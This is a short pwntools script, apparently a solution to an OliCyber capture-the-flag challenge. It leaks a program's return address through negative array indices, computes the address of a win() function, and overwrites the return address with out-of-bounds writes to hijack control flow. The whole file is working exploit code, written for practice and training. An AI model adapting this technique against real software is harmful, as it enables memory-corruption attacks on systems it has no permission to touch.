from pwn import *

r = remote("fritto-disordinato.challs.olicyber.it", 33001)

# ----- Return address load_num ----- # [ret_addr => (low = vec[-10], high = vec[-9])]
r.sendlineafter(b"> ", b"1")
r.recvline()
r.sendline(b"-9")
high = int(r.recvline().decode().split(": ")[1].strip()) & 0xffffffff

r.sendlineafter(b"> ", b"1")
r.recvline()
r.sendline(b"-10")
low = int(r.recvline().decode().split(": ")[1].strip()) & 0xffffffff

ret_addr = (high << 32) | low

# ----- Address win() ----- #
#                               print/x win - (main+241)
#                               $10 = 0x21f
win_addr = ret_addr + 0x21f

high = win_addr >> 32
low = win_addr & 0xffffffff

# ----- Sovrascrivo return address main ----- # [ret_addr => (low = vec[34], high = vec[35])]
r.sendlineafter(b"> ", b"0")
r.recvline()
r.sendline(b"34")
r.recvline()
r.sendline(str(low).encode())

r.sendlineafter(b"> ", b"0")
r.recvline()
r.sendline(b"35")
r.recvline()
r.sendline(str(high).encode())

# ----- Esco dal programma ----- #
r.sendlineafter(b"> ", b"7")
print(r.recvall().decode())